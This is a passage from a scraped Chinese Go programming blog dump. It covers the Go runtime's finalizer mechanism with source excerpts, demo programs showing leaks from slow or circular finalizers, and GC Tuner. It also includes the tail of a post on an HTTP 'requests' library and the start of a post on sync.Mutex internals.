ToBufioReader(func(r *bufio.Reader) error &#123; // 直接复制 _, err := io.Copy(w, r) return err &#125;)&#125; 除此之外，requests 还提供了 ToBufioReader 和 ToBufioScanner，这两者分别接受入参为 *bufio.Reader 和 *bufio.Scanner 的函数，可以从被 requests 注入的入参中持续地读取内容，这对于响应体非常大的请求是非常友好的。 2.4. 其他除此之外，requests 还允许使用方在 Builder 中设置自定义的 http.Client，这个结构体可以通过配置内部字段而调整请求的处理流程（RoundTripper），requests 为此还封装了一些常用的 helper 函数，从而让它具备更高的普适性，这部分就不展开说明了，感兴趣的朋友可以自行阅读相关代码（redirects.go、recorder.go、transport.go）。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"finalizer 与内存泄漏与 gc tuner","slug":"golang-finalizer","date":"2023-07-25T16:22:10.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2023/07/26/golang-finalizer/","link":"","permalink":"/2023/07/26/golang-finalizer/","excerpt":"","text":"前言golang 是一门 GC 类语言，所以开发者无需关心内存管理相关的问题，因为不再被使用的内存会自动被垃圾回收器清理掉。针对 GC 管理的堆内存空间，golang 对开发者提供了 Finalizer 机制，当某部分内存被认为是无用内存时，与之关联的 Finalizer 就会被 runtime 执行。这样对开发者来说，Finalizer 就相当于是 GC 的钩子函数，可以在绑定的函数中写一些资源回收类的操作。 本文针对 Finalizer 的相关代码进行分析，并讨论这项技术可能导致的一些问题，由于篇幅原因，在分析代码时会只关注核心逻辑。 概述Finalizer 相当于是 GC 的钩子，所以它的执行流程中自然少不了 GC 的参与。具体来说，golang 采用的垃圾回收算法是标记清除算法，如果一个对象设置了 Finalizer，那么在标记阶段需要将该对象中所有指针类字段指向的内存标记为可达，因为 Finalizer 绑定的函数唯一的入参就是这个对象，那么就需要保证这个对象内部的字段都是可用的；另一方面，Finalizer 在垃圾回收的清除阶段才会被执行，对应的对象在本次垃圾回收时会重新被标记为存活，直到对应的 Finalizer 函数执行完毕后，这个对象对应的内存才会被释放（即便在这个期间有新一轮的 GC 被触发，这个用户侧不可达的对象也不会被清理，因为 Finalier 中保存有这个对象的指针，而 Finalizer 是一种 root 对象，所以扫描 Finalizer 时就会把这个对象标记为可达的）。 golang 的 runtime 使用一个独立的协程来串行执行所有的 Finalizer，这个协程平时处于休眠状态，GC 的清除阶段如果发现有需要执行的 Finalizer，那么会设置一个标记位（runtime.fingwake），在协程调度阶段，runtime.findrunnable 函数负责确保“一定会找到一个可执行的协程”，其中就会判断这个标记位，并按需将这个负责执行 Finalizer 的协程运行在当前的 M 上。 回到 Finalizer 本身上，它是怎么和对象关联起来的呢？golang 的内存模型中，runtime.mspan 是最细粒度的内存管理单元，每个 mspan 结构管理一块内存，这块内存被划分成多个相同规格的小内存，所以被 mspan 管理的每一块小内存都有自己的 offset（相当于是小内存数组的下标）；而 mspan 这个结构体中有一个 specials 字段，这是一个 special 结构的链表，golang 中有许多 special，Finalizer 就是其中一种。special 结构中有一个 offset 字段，这个 offset 正是前面提到的某块小内存对应的 offset。总结来说，给定一个 offset，我们能从 mspan 管理的内存中找到某块小内存，也能从 specials 链表中找到对应的 Finalizer（如果有的话），而这个小内存在用户侧的表现就是一个对象，因此这个 offset 就把某个对象和 Finalizer 联系起来了。 有了这些背景知识，我们就可以一起来看一下相关的代码了。 设置与取消设置 Finalizergolang 对开发者只暴露了 runtime.SetFinalizer 一个函数来操作 Finalizer，第一个参数是想要绑定 Finalier 的对象，这个参数需要是一个指针，而第二个参数则相对灵活，当它是一个符合条件的函数时，runtime.SetFinalier 被用于设置 Finalizer；而当第二个参数是 nil 时，该函数就被用于取消设置 Finalizer。同一个对象只能被设置一次 Finalizer，重复设置会导致 panic。下面直接来看一下关键部分的代码： 12345678910111213141516171819202122232425262728293031323334353637func SetFinalizer(obj interface&#123;&#125;, finalizer interface&#123;&#125;) &#123; // 确保 obj 是指针类型，且指向堆内存空间 ... f := efaceOf(&amp;finalizer) ftyp := f._type if ftyp == nil &#123; // 如果第二个参数传了个 nil 进来，那么就调用 removefinalizer 移除掉已经存在的 Finalizer systemstack(func() &#123; removefinalizer(e.data) &#125;) return &#125; // 确保第二个参数的类型是正确的 ...okarg: // 计算 finalizer 这个函数的返回值需要多大的内存，因为在调用它时会构建一个假的栈帧， // 但是实际上这个返回值没有任何作用 nret := uintptr(0) for _, t := range ft.out() &#123; nret = alignUp(nret, uintptr(t.align)) + uintptr(t.size) &#125; nret = alignUp(nret, sys.PtrSize) // 创建一个协程，这个协程会在后台串行执行所有的 Finalizer createfing() // 调用 addfinalizer 将 obj 与 finalizer 绑定起来，仅在 obj 已经绑定过 finalizer 时返回 false， // 由于一个对象只能与一个 finalizer 绑定，所以程序会直接 panic systemstack(func() &#123; if !addfinalizer(e.data, (*funcval)(f.data), nret, fint, ot) &#123; throw(\"runtime.SetFinalizer: finalizer already set\") &#125; &#125;)&#125; 设置 Finalizerruntime.SetFinalizer 在验证参数合法后会调用 runtime.addfinalizer 来完成对象与 Finalizer 的绑定： 12345678910111213141516171819202122232425262728293031323334353637383940func addfinalizer(p unsafe.Pointer, f *funcval, nret uintptr, fint *_type, ot *ptrtype) bool &#123; // 获取一块内存用于保存 specialfinalizer 对象，specialfinalizeralloc 是一个 fixalloc 结构， // mheap 有很多 fixalloc，这是一个简单的带缓存的内存分配器，非并发安全所以需要加锁 lock(&amp;mheap_.speciallock) s := (*specialfinalizer)(mheap_.specialfinalizeralloc.alloc()) unlock(&amp;mheap_.speciallock) // 设置内部字段，这个 fn 就是传进来的 finalizer 函数，这里是一个 funcval 结构， // 而 gc 的标记阶段会扫描这个 funcval，所以 finalizer 如果是个闭包函数，闭包捕获的变量也会存活 s.special.kind = _KindSpecialFinalizer s.fn = f s.nret = nret s.fint = fint s.ot = ot // 将 special 与 p 地址对应的对象关联起来，这里虽然绑定的是 s.special， // 但是由于 special 是 specialfinalizer 结构起始的字段，所以它们实际拥有同样的地址， // 那么根据 special 就可以通过 unsafe.Pointer 强制转换回 specialfinalizer， // 后面在执行的时候就是用这个原理来根据 special 拿到的 specialfinalizer if addspecial(p, &amp;s.special) &#123; if gcphase != _GCoff &#123; base, _, _ := findObject(uintptr(p), 0, 0) mp := acquirem() gcw := &amp;mp.p.ptr().gcw // 确保 p 对应对象内部的所有指针对象都被标记存活，因为在调用 finalier 时要用到这个对象 scanobject(base, gcw) // 扫描 funcval，所以如果有闭包捕获的变量也会被标记存活 scanblock(uintptr(unsafe.Pointer(&amp;s.fn)), sys.PtrSize, &amp;oneptrmask[0], gcw, nil) releasem(mp) &#125; return true &#125; // 如果执行到这里，那么 addspecial 返回了 false，而它只有 p 对应的对象已经绑定 Finalizer 时才会返回 false， // 所以这里返还前面 alloc 得到的内存，向 caller 返回 false，caller（SetFinalizer）会直接 panic lock(&amp;mheap_.speciallock) mheap_.specialfinalizeralloc.free(unsafe.Pointer(s)) unlock(&amp;mheap_.speciallock) return false&#125; runtime.addspecial 用于在 mspan 层面将 p 对应的内存与 special 绑定起来： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950func addspecial(p unsafe.Pointer, s *special) bool &#123; // 根据指针反查对应的 mspan 结构，如果 span 为 nil，那么说明 p 指向的内存不属于堆内存空间， // 不过前面 SetFinalizer 验证过这个问题，所以对于 Finalizer 而言应该不会出现 nil 的情况 span := spanOfHeap(uintptr(p)) if span == nil &#123; throw(\"addspecial on invalid pointer\") &#125; // 按需和 gc 同步，确保在当前 mspan 的 gc 清理阶段不会新增 special， // 因为 mspan 的清扫阶段会读内部的 specials 链表，找到需要执行的 special（包括 Finalier）， // 而这个读操作没有加锁 mp := acquirem() span.ensureSwept() // 获取 p 相对于 mspan 基地址的偏移量，我们前面提到过，这个 offset 用于将 p 与 Finalizer 联系起来 offset := uintptr(p) - span.base() kind := s.kind lock(&amp;span.speciallock) t := &amp;span.specials for &#123; x := *t if x == nil &#123; break &#125; // 如果 offset 和 kind 都相同，就说明 p 对应的地址已经绑定过 Finalier 了， // 此时向 caller 返回 false if offset == uintptr(x.offset) &amp;&amp; kind == x.kind &#123; unlock(&amp;span.speciallock) releasem(mp) return false &#125; // 这个操作一方面能让 for 循环提前结束，一方面能保证 specials 链表中的元素是有序的 if offset &lt; uintptr(x.offset) || (offset == uintptr(x.offset) &amp;&amp; kind &lt; x.kind) &#123; break &#125; t = &amp;x.next &#125; // 将新的 special 加入到链表中合适的位置，标记 mspan 有 special，这样就完成了 Finalier 的绑定操作 s.offset = uint16(offset) s.next = *t *t = s spanHasSpecials(span) unlock(&amp;span.speciallock) releasem(mp) return true&#125; 取消 Finalizer如果 runtime.SetFinalizer 的第二个参数是一个 nil，那么最终这个函数会调用 runtime.removefinalizer，从而解除对象与其 Finalizer 的绑定关系，与设置 Finalizer 不同，取消绑定这一操作是幂等的，重复调用也不会导致程序 panic。下面一起来看下 runtime.removefinalizer 的代码： 123456789101112func removefinalizer(p unsafe.Pointer) &#123; // 调用 removespecial 来移除 _KindSpecialFinalizer 类型的 special，其实就是 Finalizer s := (*specialfinalizer)(unsafe.Pointer(removespecial(p, _KindSpecialFinalizer))) if s == nil &#123; return // 如果没找到与对象绑定的 Finalizer 就直接返回，这里就是幂等的 &#125; // 这里的 free 并没有将内存还给操作系统，而是将其缓存起来方便下次 alloc 时复用 lock(&amp;mheap_.speciallock) mheap_.specialfinalizeralloc.free(unsafe.Pointer(s)) unlock(&amp;mheap_.speciallock)&#125; 与 runtime.addspecial相反 ， runtime.removespecial 的作用是在 mspan 层面将 p 对应的内存与已经存在的 special 解绑： 123456789101112131415161718192021222324252627282930313233343536373839404142func removespecial(p unsafe.Pointer, kind uint8) *special &#123; // 获取 p 内存所在的 mspan 结构体 span := spanOfHeap(uintptr(p)) if span == nil &#123; throw(\"removespecial on invalid pointer\") &#125; // 和 addspecial 一样，这里也需要确保当前 mspan 的 GC 的清扫已经完成 mp := acquirem() span.ensureSwept() // 计算 offset，这个 offset 用于寻找对应的 Finalizer offset := uintptr(p) - span.base() var result *special lock(&amp;span.speciallock) t := &amp;span.specials // 遍历 specials 链表，找到 offset 对应的 Finalizer， // 但是其实 special 结构是按 offset 排序的，所以这里可以不完全遍历整条链表 for &#123; s := *t if s == nil &#123; break &#125; if offset == uintptr(s.offset) &amp;&amp; kind == s.kind &#123; *t = s.next result = s break &#125; t = &amp;s.next &#125; // 如果当前的 mspan 已经没有 specials 了，那么就调用 spanHasNoSpecials 标记它 if span.specials == nil &#123; spanHasNoSpecials(span) &#125; unlock(&amp;span.speciallock) releasem(mp) // 返回找到的结果，或者如果没找到就返回一个 nil return result&#125; 执行 Finalizer在 runtime.SetFinalizer 中，如果尝试给某个对象绑定 Finalizer，那么流程中会走到 runtime.createfing 函数，这个函数的内容是这样的： 123456func createfing() &#123; // 通过全局的 fingCreate 函数来确保 if 块中的逻辑只被执行一次 if fingCreate == 0 &amp;&amp; atomic.Cas(&amp;fingCreate, 0, 1) &#123; go runfinq() &#125;&#125; 而 runtime.runfinq 是被另一个 gouroutine 来执行的，这就是我们说的那个会负责串行执行所有 Finalizer 函数的 goroutine，我们来重点看它前半部的代码： 1234567891011121314151617181920212223242526272829303132func runfinq() &#123; // 先不管这两个变量，这是执行 Finalizer 时才会用到的，用于构造假的栈帧 var ( frame unsafe.Pointer framecap uintptr ) // 整个函数是一个永不停止的 for 循环 for &#123; // 下面这些 finq、fing 都是全局变量，而 finlock 用于确保这些全局变量变更时的原子性 lock(&amp;finlock) // 获取当前 finq 中的内容，finq 中会保存所有的待执行 Finalizer 函数， // 这个变量的赋值逻辑我们后面会提到 fb := finq finq = nil // 当前没有待执行的 Finalizer，陷入休眠 if fb == nil &#123; gp := getg() fing = gp // 设置 fingwait，代表当前有负责执行 Finalizer 的 goroutine 在等待被调度执行 fingwait = true // 调用 gopark 将当前 goroutine 挂起，当前的 m 会去执行其他的 goroutine goparkunlock(&amp;finlock, waitReasonFinalizerWait, traceEvGoBlock, 1) continue &#125; unlock(&amp;finlock) ... // 执行 fb 中所有的 Finalizer &#125;&#125; 可以发现，fing 这个 goroutine 一直在一个永不停止的 for 循环中打转，每次循环时尝试从 finq 中拿到待执行的 Finalizer 并去执行它们，而如果 finq 是空的，那么就设置 fingwait 并将 fing 挂起。不难想到，只有 finq 中有内容后才应该唤醒 fing，否则就没有任何意义。所以现在我们就需要关注两个点，第一是 finq 中什么时候有内容，第二是如何唤醒 fing。 先来看什么时候有内容，GC 的清理阶段最终会落实到每一个 msapn 上，具体来说是会调用到 mspan.sweep 这个方法。在这个方法中有这样一段逻辑： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859func (s *mspan) sweep(preserve bool) bool &#123; ... // mspan 中保存的小内存块大小 size := s.elemsize hadSpecials := s.specials != nil specialp := &amp;s.specials special := *specialp for special != nil &#123; // 获取 offset 对应对象在 mspan 中的下标，因为比如对于 struct&#123;a, b int&#125; 这样的对象而言， // a 和 b 均可以设置 Finalizer，但是整个 struct 在 GC 的清扫阶段是被看作一个整体的， // 所以内部字段绑定的 Finalizer 均会被执行，然后需要把整个 struct 标记为存活（这需要知道下标）， // 通过整数除法的方式可以根据 a 和 b 的地址获取整个 struct 在 mspan 中的下标 objIndex := uintptr(special.offset) / size p := s.base() + objIndex*size // 根据对象的下标获取对应的标记位图 mbits := s.markBitsForIndex(objIndex) // 如果没有标记，说明这个对象在用户侧没有来自 root 对象的引用，在没有 Finalizer 的情况下应该被删除 if !mbits.isMarked() &#123; hasFin := false endOffset := p - s.base() + size // special 是根据 offset 从小到大排序的，所以可以把 endOffset 作为循环结束条件 for tmp := special; tmp != nil &amp;&amp; uintptr(tmp.offset) &lt; endOffset; tmp = tmp.next &#123; if tmp.kind == _KindSpecialFinalizer &#123; // 发现对象有 Finalizer，需要将对应的对象标记存活，让它至少再活一轮 GC mbits.setMarkedNonAtomic() hasFin = true break &#125; &#125; for special != nil &amp;&amp; uintptr(special.offset) &lt; endOffset &#123; p := s.base() + uintptr(special.offset) if special.kind == _KindSpecialFinalizer || !hasFin &#123; // 从链表中删除这个 special，然后把相关信息传递给 freespecial， // 这个 freespecial 就是将 Finalizer 放到 finq 中的关键函数 y := special special = special.next *specialp = special freespecial(y, unsafe.Pointer(p), size) &#125; else &#123; specialp = &amp;special.next special = *specialp &#125; &#125; &#125; else &#123; // 被标记了，说明对象经历了这轮 GC 后依然存活，所以不需要执行 Finalizer specialp = &amp;special.next special = *specialp &#125; &#125; // 如果之前当前 mspan 有 special 但经历了上面的循环后没有 special， // 那么调用 spanHasNoSpecials 标记 if hadSpecials &amp;&amp; s.specials == nil &#123; spanHasNoSpecials(s) &#125; 从链表上取下来的 Finalizer 会被送到 runtime.freespecial 这个函数中，事实上其他的 special 也在这里被处理，不过我们只关注 Finalizer 的部分： 12345678910111213141516171819202122func freespecial(s *special, p unsafe.Pointer, size uintptr) &#123; switch s.kind &#123; case _KindSpecialFinalizer: // 这里印证了前面的结论，虽然入参的 s 是一个 special，但实际它是 specialfinalizer 的一部分， // 且是它的第一个字段，所以两者拥有相同的地址，可以通过 unsafe.Pointer 强转， // golang 虽然不希望对使用者暴露太多指针的概念，但这种强转确实好用且高效， // 这也是在 c 语言中实现多态的有效手段 sf := (*specialfinalizer)(unsafe.Pointer(s)) // 使用转换出来的 specialfinalizer 结构调用 queuefinalizer 函数 queuefinalizer(p, sf.fn, sf.nret, sf.fint, sf.ot) // 调用结束后，“回收” specialfinalizer 对应的内存，fixalloc 会将其缓存方便下次使用 lock(&amp;mheap_.speciallock) mheap_.specialfinalizeralloc.free(unsafe.Pointer(sf)) unlock(&amp;mheap_.speciallock) ... default: throw(\"bad special kind\") panic(\"not reached\") &#125;&#125; runtime.freespecial 根据 kind 字段的取值把入参的 special 结构转换成具体的 special 然后分别处理，针对 Finalizer 就是调用 runtime.queuefinalizer 函数，这个函数的逻辑是这样的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445func queuefinalizer(p unsafe.Pointer, fn *funcval, nret uintptr, fint *_type, ot *ptrtype) &#123; if gcphase != _GCoff &#123; // GC 的清扫阶段对应的 gcPhase 是 GCoff，需要确保状态是对的 throw(\"queuefinalizer during GC\") &#125; // 下面反正就是往 finq 里塞东西，有个 finc 是缓存 finblock 结构用的， // 设计思路类似于 fixalloc，把上层认为可以回收的内存缓存起来给下次用 lock(&amp;finlock) if finq == nil || finq.cnt == uint32(len(finq.fin)) &#123; if finc == nil &#123; finc = (*finblock)(persistentalloc(_FinBlockSize, 0, &amp;memstats.gcMiscSys)) finc.alllink = allfin allfin = finc if finptrmask[0] == 0 &#123; if (unsafe.Sizeof(finalizer&#123;&#125;) != 5*sys.PtrSize || unsafe.Offsetof(finalizer&#123;&#125;.fn) != 0 || unsafe.Offsetof(finalizer&#123;&#125;.arg) != sys.PtrSize || unsafe.Offsetof(finalizer&#123;&#125;.nret) != 2*sys.PtrSize || unsafe.Offsetof(finalizer&#123;&#125;.fint) != 3*sys.PtrSize || unsafe.Offsetof(finalizer&#123;&#125;.ot) != 4*sys.PtrSize) &#123; throw(\"finalizer out of sync\") &#125; for i := range finptrmask &#123; finptrmask[i] = finalizer1[i%len(finalizer1)] &#125; &#125; &#125; block := finc finc = block.next block.next = finq finq = block &#125; f := &amp;finq.fin[finq.cnt] atomic.Xadd(&amp;finq.cnt, +1) f.fn = fn f.nret = nret f.fint = fint f.ot = ot f.arg = p // 注意这里设置了 fingwake 这个全局变量的值 fingwake = true unlock(&amp;finlock)&#125; 总结来说，GC 的清扫阶段将各个 mspan 上的 Finalizer 塞进了 finq 结构，这样当 fing 协程被唤醒时就可以顺利地从 finq 中获取到待执行的 Finalizer 并串行执行它们。那么现在剩下的唯一问题就是如何唤醒 fing 了，在前面分析 fing 的代码时我们看到它在陷入休眠前设置了 fingwait 这个变量，现在 runtime.queuefinalizer 又设置了 fingwake，现在就需要有一个地方能感知到这两个变量的变化并做实际的唤醒操作。不难想到，这应该是调度器做的事情，具体来说，runtime.findrunnable 会接下这个任务： 123456789101112131415161718192021222324252627func findrunnable() (gp *g, inheritTime bool) &#123; ... // 如果 fingwait 为 true 且 fingwake 也为 true，那么就调用 wakgfing， // 如果能获取到对应的 g 的指针（其实就是全局变量 fing），那么就调用 runtime.ready， // 将对应的 g 放到调度队列中等待 m 来执行它 if fingwait &amp;&amp; fingwake &#123; if gp := wakefing(); gp != nil &#123; ready(gp, 0, true) &#125; &#125; ...&#125;func wakefing() *g &#123; // 可以看到，其实就是把 fing 返回出去了 var res *g lock(&amp;finlock) if fingwait &amp;&amp; fingwake &#123; fingwait = false fingwake = false res = fing &#125; unlock(&amp;finlock) return res&#125; Finalizer 的一些问题长耗时操作导致其他对象的 Finalizer 无法被执行我们在上面分析了 Finalizer 的执行过程，可以看到只有一个 fing 在后台默默地串行执行所有的 Finalizer，所以如果有一个 Finalizer 的逻辑耗时很长，那么后面的 Finalizer 就只能等待，而即便这期间有新一轮的 GC 被执行，后面 Finalizer 绑定的对象也无法被清理，因为 Finalizer 函数的入参就是这个对象，需要保证在执行时这个对象是可用的。所以如果这个对象占用了大量的内存，那么在对应的 Finalizer 被执行前，它占用的内存就无法被释放。为了避免这种情况导致的“内存泄露”， runtime.SetFinalizer 的注释中也提到，如果有这种长耗时的 Finalizer，最好在内部创建一个新的 goroutine 来完成这部分逻辑。 下面是一个例子，尽管我们每秒主动触发一次 GC 操作，但 b 对象仍然要等绑定的 Finalizer 执行完毕后才能被释放： 1234567891011121314151617181920212223242526272829package mainimport ( \"fmt\" \"runtime\" \"time\")func main() &#123; var a, b int &#123; // 为 a 设置一个长耗时的 Finalizer runtime.SetFinalizer(&amp;a, func(interface&#123;&#125;) &#123; fmt.Println(\"start to exec a finalizer\") time.Sleep(5 * time.Second) fmt.Println(\"a finalizer finished\") &#125;) // 虽然 b 的 Finalizer 耗时很短，但它需要等 a 执行完毕 runtime.SetFinalizer(&amp;b, func(interface&#123;&#125;) &#123; fmt.Println(\"start to exec b finalizer\") fmt.Println(\"b finalizer finished\") &#125;) &#125; for range time.NewTicker(time.Second).C &#123; fmt.Println(\"call runtime.GC()\") runtime.GC() &#125;&#125; 执行结果： 12345678910111213&gt; go run -gcflags '-N -l' .call runtime.GC()start to exec a finalizercall runtime.GC()call runtime.GC()call runtime.GC()call runtime.GC()call runtime.GC()a finalizer finishedstart to exec b finalizerb finalizer finishedcall runtime.GC()call runtime.GC() 循环引用导致内存泄漏如果有一个对象绑定了 Finalizer，那么这个对象本身及其内部字段都要持续存活，直到对应的 Finalizer 执行完毕。如果我们构建了一个循环引用，a 是 b 的内部字段，b 是 a 的内部字段，且 a 和 b 都设置了 Finalizer，那么 b 会因为 a 的 Finalizer 而持续存活，a 会因为 b 的 Finalizer 而持续存活。这样一来，尽管用户侧已经没有了对 a 和 b 的引用，但由于前面循环引用的存在，a 和 b 都无法被释放。 下面是一个例子： 12345678910111213141516171819202122232425262728293031323334package mainimport ( \"fmt\" \"runtime\" \"time\")func main() &#123; type T struct &#123; ptr *T &#125; // 构建循环引用 a := &amp;T&#123;&#125; b := &amp;T&#123;ptr: a&#125; a.ptr = b // 如果把这行注释掉，就不会循环引用 // 设置 runtime.SetFinalizer &#123; runtime.SetFinalizer(a, func(interface&#123;&#125;) &#123; fmt.Println(\"a finalizer\") &#125;) runtime.SetFinalizer(b, func(interface&#123;&#125;) &#123; fmt.Println(\"b finalizer\") &#125;) &#125; a, b = nil, nil for range time.NewTicker(time.Second).C &#123; fmt.Println(\"call runtime.GC()\") runtime.GC() &#125;&#125; 执行结果： 12345&gt; go run -gcflags '-N -l' .call runtime.GC()call runtime.GC()call runtime.GC()... GC Tuner 对 Finalizer 的应用GC Tuner 是 uber 提出的一种针对 GC 的优化手段，其原理是在每次 GC 被触发时动态调整 GOGC 的取值，从而保证内存一直维持在一个比较恒定的水位，最终达到空间换时间的效果，避免 GC 的频繁发生。在这个过程中有两个核心的操作，第一是我们需要在每次 GC 到来时都执行一段自定义逻辑，第二是这段自定义逻辑用来调整 GOGC 的取值。 经过前面的分析，不难想到这里的第一点可以用 Finalizer 技术来实现。具体来说，对一个对象设置了 Finalizer 后，当 GC 到达清扫阶段后会执行绑定的函数，函数执行结束后才会释放对象对应的内存。那么如果我们在绑定的函数中再次为这个对象设置 Finalizer，就可以保证这个对象持续存活到下一次绑定函数被执行。通过这种递归的方式，就可以确保对象一直存活，而 Finalizer 函数不断地被 GC 清扫阶段触发，而这恰好符合 GC Tuner 的目标。 但需要注意的是，其他对象绑定的 Finalizer 不能包含长耗时的操作，否则就会遇到我们前面提到过的问题，可能会有几轮 GC 脱离了 GC Tuner 的控制。 下面是一个例子，对象 a 绑定的 Finalizer 函数会因为 GC 的触发而不断被调用： 123456789101112131415161718192021222324package mainimport ( \"fmt\" \"runtime\" \"time\")func main() &#123; var ( a int finalFunc func(interface&#123;&#125;) ) finalFunc = func(ap interface&#123;&#125;) &#123; fmt.Println(\"can u see me?\") runtime.SetFinalizer(ap, finalFunc) &#125; runtime.SetFinalizer(&amp;a, finalFunc) for range time.NewTicker(time.Second).C &#123; fmt.Println(\"call runtime.GC()\") runtime.GC() &#125;&#125; 执行结果： 123456789101112131415&gt; go run -gcflags '-N -l' .call runtime.GC()call runtime.GC()can u see me?call runtime.GC()can u see me?call runtime.GC()can u see me?call runtime.GC()can u see me?call runtime.GC()can u see me?call runtime.GC()can u see me?...","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"sync 标准库部分内容源码解读","slug":"golang-sync-package-v2","date":"2023-07-01T09:06:08.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2023/07/01/golang-sync-package-v2/","link":"","permalink":"/2023/07/01/golang-sync-package-v2/","excerpt":"","text":"1. 前言之前曾经阅读过 x/sync 包的代码，这些工具在 sync 标准库的基础上封装出更贴合业务的抽象。相对比之下，sync 中提供的内容就更底层一些。最近心血来潮想继续研究下 sync 本身的一些内容，于是就有了这篇博客。本篇博客尝试从源码的角度来讨论其中的三个常用工具，并假设读者有过它们的使用经验，所以不会在使用方式上做过多说明。此外为了更加关注核心逻辑，我们下文贴出的代码会删减掉 race 相关的内容。 在介绍具体的工具前，我们需要先意识到一个问题，就是 golang 通过提供协程来向使用者屏蔽了操作系统层面的进程和线程，所以标准库中提供的各种工具也是用于做协程间同步的，这也就少不了与运行时的相互配合，这里具体来说就是信号量，事实上这篇文章所介绍的三个工具中都用到了信号量来做协程的阻塞与唤醒。我们这里不对信号量的原理做解释，只需要了解在 golang 中它能够提供的功能即可。 2. Mutex2.1. 基本原理Mutex 对外仅提供 Lock 和 Unlock 两个方法，并保证同一时间仅能有一个协程从 Lock 方法返回，其他与之竞争的协程在 Unlock 方法被调用前会阻塞在 Lock 方法中。但 golang 并没有限制调用 Unlock 方法的协程一定是成功从 Lock 方法返回的协程，也就是说幸运的协程 a 通过 Lock 获取到锁后，另一个协程 b 也可以调用 Unlock 来解除 a 对锁的占用。 Mutex 核心依赖 atomic 提供的原子操作以及前文提到的 runtime 提供的信号量，通过这两个工具的相互配合来对外提供便捷的方法调用。在加锁时，未能成功获取到锁的协程可能会尝试进行自旋，自旋会为它提供更多的机会来成功获取这个锁。当自旋失败时，协程就会通过信号量阻塞起来，直到锁被释放时才有机会被唤醒继续尝试加锁。由于同一时间只有一个协程能获取到锁，所以阻塞的协程会相对更多。为了避免阻塞的协程长时间获取不到锁导致的饥饿现象，golang 为 Mutex 加入了“饥饿模式”，在饥饿模式下已经阻塞过的协程会优先于新来的协程获取锁。 2.2. 核心数据结构Mutex 的核心结构自然就是 Mutex 结构体，这个结构体的构成非常简单，具体如下： 1234type Mutex struct &#123; state int32 sema uint32&#125; 其中 sema 非常简单，仅仅用于作为信号量来实现协程的阻塞与唤醒；而 state 用于记录 Mutex 当前的状态，右边第一位代表当前 Mutex 是否已上锁，第二位代表当前是否有协程被唤醒，第三位代表当前 Mutex 是否处于“饥饿模式”，从第四位开始到最左边共计 29 位用于记录当前有多少个协程被阻塞。为了方便操作，标准库提供了一些常量来记录这些信息，具体如下： 123456const ( mutexLocked = 1 &lt;&lt; iota // 取值为 1，通过“与操作”来判断是否加锁 mutexWoken // 取值为 2，通过“与操作”来判断是否有协程被唤醒 mutexStarving // 取值为 4，通过“与操作”来判断是否处于饥饿模式 mutexWaiterShift = iota // 取值为 3，通过“左移右移”来从 state 中获取阻塞的协程数量) 通过上面的这段描述我们就可以发现，一个零值的 Mutex 就是一个有效的初态的锁，所以我们可以简单通过 Mutex{} 或 &amp;Mutex{} 来初始化一个锁，标准库也就没有对外提供类似 NewMutex 这样的函数。 2.3. 加锁过程Mutex 的加锁被分成了两个函数：作为主体对外暴露的 Lock 方法和 Lock 内部可能调用的 lockSlow 方法。其中，Lock 方法的定义非常简单，具体如下： 12345678func (m *Mutex) Lock() &#123; // Fast path: grab unlocked mutex. if atomic.CompareAndSwapInt32(&amp;m.state, 0, mutexLocked) &#123; return &#125; // Slow path (outlined so that the fast path can be inlined) m.lockSlow()&#125; 可以看到 Lock 方法仅仅就是通过 CAS 来尝试将 state 的最低位置一，对于一个初态的锁而言这一个简单的操作就足够了，所以这被称为 fast-path。但事实上锁竞争是不可避免的，否则就不需要使用 Mutex 了，对于这类情况，流程会进入到 lockSlow 方法中。 其实这种 fast-path + slow-path 的编码方式在 golang 标准库的好多地方都可以看到，这样写的一个好处在于外层的 Lock 方法足够简单以至于可以被内联到调用处，而一旦形成内联，那么 fast-path 就真的非常快了。 回到 lockSlow，这个函数应该说是 Mutex 的核心所在了。我们直接给出这个函数的流程注释： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596func (m *Mutex) lockSlow() &#123; var waitStartTime int64 // 如果协程陷入阻塞，记录开始阻塞的时间 starving := false // 如果为 true，那么当前协程应该将 Mutex 设置为饥饿模式 awoke := false // 和 mutexWoken 配合用于保证同一时间仅有一个协程被唤醒 iter := 0 // 当前协程已经自旋的次数，在下次被唤醒时会重置 old := m.state // 刚调用 lockSlow 时，state 的取值 for &#123; // 如果当前 Mutex 已加锁且不处于饥饿模式，并且 runtime_canSpin 返回 true， // 那么虽然当前协程没有获取到锁，但它被允许通过自旋来避免立即陷入阻塞 if old&amp;(mutexLocked|mutexStarving) == mutexLocked &amp;&amp; runtime_canSpin(iter) &#123; // 如果当前协程是新来的协程，且虽然当前有因获取不到锁而阻塞的协程，但 Mutex 还没有唤醒它们， // 那么尝试设置 mutexWoken，因为既然新来的协程在自旋，那么就说明已经有锁竞争， // 此时 Mutex 继续唤醒协程会进一步加剧锁竞争的剧烈程度 if !awoke &amp;&amp; old&amp;mutexWoken == 0 &amp;&amp; old&gt;&gt;mutexWaiterShift != 0 &amp;&amp; atomic.CompareAndSwapInt32(&amp;m.state, old, old|mutexWoken) &#123; awoke = true &#125; // 自旋，实际上是调用了 pause 指令 runtime_doSpin() iter++ // 获取新的 state，因为自旋的过程中 state 的取值可能会发生变化 old = m.state continue &#125; // 以旧的 state 取值为基础，后面的流程在更新这个 new 变量，最后再通过 CAS 操作尝试更新 old new := old // 仅在非饥饿模式下，新来的协程才被允许加锁，因为饥饿模式下锁会被交给被唤醒的协程 if old&amp;mutexStarving == 0 &#123; new |= mutexLocked &#125; // 如果 Mutex 已经加锁或已经处于饥饿模式，那么当前协程只能乖乖陷入阻塞， // 但在那之前需要增加 waiter 的数量，这样 Unlock 才知道该唤醒多少个协程 if old&amp;(mutexLocked|mutexStarving) != 0 &#123; new += 1 &lt;&lt; mutexWaiterShift &#125; // starving 是在当前协程被唤醒时才有可能更新的，而一旦它为 true，就代表 Mutex 需要进入饥饿模式 if starving &amp;&amp; old&amp;mutexLocked != 0 &#123; new |= 